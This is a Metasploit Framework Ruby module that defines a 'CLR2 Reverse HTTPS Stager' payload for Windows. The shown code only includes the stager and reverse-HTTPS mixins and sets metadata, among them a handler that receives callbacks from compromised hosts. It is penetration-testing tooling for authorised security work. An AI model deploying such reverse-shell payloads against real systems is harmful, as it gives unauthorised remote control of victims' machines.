##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_https'
require 'msf/core/payload/clr2/reverse_https'

module MetasploitModule

  CachedSize = 414

  include Msf::Payload::Stager
  include Msf::Payload::Clr2::ReverseHttps

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'CLR2 Reverse HTTPS Stager',
      'Description' => 'Tunnel communication over HTTPS (CLR2)',
      'Author'      => ['OJ Reeves'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_CLR2,
      'Handler'     => Msf::Handler::ReverseHttps,
      'Convention'  => 'https'
    ))
  end
end
